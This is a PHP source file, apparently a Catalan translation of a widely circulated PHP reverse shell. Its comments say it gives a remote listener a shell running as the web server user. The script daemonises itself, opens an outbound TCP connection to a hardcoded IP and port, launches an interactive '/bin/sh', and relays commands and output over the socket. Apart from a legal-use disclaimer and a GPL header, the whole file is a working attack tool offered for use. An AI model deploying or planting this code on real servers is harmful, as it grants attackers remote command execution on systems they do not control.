<?php

// Aquesta eina només es pot utilitzar amb finalitats legals. Els usuaris assumeixen tota la responsabilitat
// per a qualsevol acció realitzada amb aquesta eina. L'autor no assumeix cap responsabilitat
// per danys causats per aquesta eina. Si aquests termes no són acceptables per a vostè, aleshores
// no utilitzeu aquesta eina.
//
// En tots els altres aspectes s'aplica la versió 2 de la GPL:
//
// Aquest programa és programari lliure; podeu redistribuir-lo i/o modificar-lo
// sota els termes de la Llicència Pública General GNU versió 2 com
// publicat per la Free Software Foundation.
//
// Aquest programa es distribueix amb l'esperança que sigui útil,
// però SENSE CAP GARANTIA; sense ni tan sols la garantia implícita de
// COMERCIABILITAT o ADEQUACIÓ PER A UN FINS PARTICULAR. Veure el
// Llicència pública general GNU per a més detalls.
//
// Aquesta eina només es pot utilitzar amb finalitats legals. Els usuaris assumeixen tota la responsabilitat
// per a qualsevol acció realitzada amb aquesta eina. Si aquests termes no són acceptables
// tu, llavors no utilitzes aquesta eina.
//
// Descripció
// -----------
// Aquest script farà una connexió TCP de sortida a una IP i un port codificats.
// El destinatari rebrà un shell que s'executa com a usuari actual (normalment Apache).
//
// Limitacions
// -----------
// proc_open i stream_set_blocking requereixen PHP versió 4.3+ o 5+
// L'ús de stream_select() als descriptors de fitxers retornats per proc_open() fallarà i retornarà FALSE a Windows.
// Algunes opcions en temps de compilació són necessàries per a la demonització (com pcntl, posix). Aquestes poques vegades estan disponibles.
//
// Ús
// -----
// Mireu https://github.com/ebantula/exploits/php-reverse-shell/ .

set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise si és possible per evitar zombis més tard.
//
// pcntl_fork gairebé mai està disponible, però ens permetrà fer daemonise
// el nostre procés php i evitar zombis. Val la pena provar...

if (function_exists('pcntl_fork')) {
  
// Bifurca (Fork) i fes que el procés principal surti.
	
  $pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: No es pot bifurcar.");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Sortides dels parents.
	}

// Feu que el procés actual sigui un líder de sessió
// Només tindrem èxit si ens bifurquem
	if (posix_setsid() == -1) {
		printit("Error: No es pot setsid()");
		exit(1);
	}

	$daemon = 1;     
} else {
	printit("ALERTA: No s'ha pogut deamonise. Això és bastant comú peró no fatal.");
}

// Canvia a un directori segur.
chdir("/");

// Elimina qualsevol umask que hem heretat
umask(0);

//
// Fes el shell invers...
//

// Obrin la connexió inversa.
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Procés de generació del shell.
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin és una pipe de la qual es llegirà.
   1 => array("pipe", "w"),  // stdout és una pipe a la qual s'escriurà.
   2 => array("pipe", "w")   // stderr és una pipe a la qual s'escriurà.
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: No es pot generar la shell");
	exit(1);
}

// Estableix-ho tot com a no bloquejador
// Motiu: les lectures ocasionals es bloquejaran, tot i que stream_select ens diu que no ho faran 
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("S'ha obert correctament el reverse shell cap a $ip:$port");

while (1) {
	// Comproveu el final de la connexió TCP
	if (feof($sock)) {
		printit("ERROR: Connexió Shell Finalitzada");
		break;
	}

	// Comproveu el final de STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Proces Shell Finalitzat");
		break;
	}

// Espereu fins que acabi una ordre $sock, o alguna
// La sortida de l'ordre està disponible a STDOUT o STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

// Si podem llegir des del sòcol TCP, enviar
// dades per processar el STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK LLEGIT");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

// Si podem llegir el STDOUT del procés
// envia dades per connexió tcp
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT LLEGIT");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

// Si podem llegir el STDERR del procés
// envia dades per connexió tcp
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR LLEGIT");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// M'agrada imprimir, però no fa res si ens hem fet deamonised
// (No puc esbrinar com redirigir STDOUT com un daemon adequat)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 
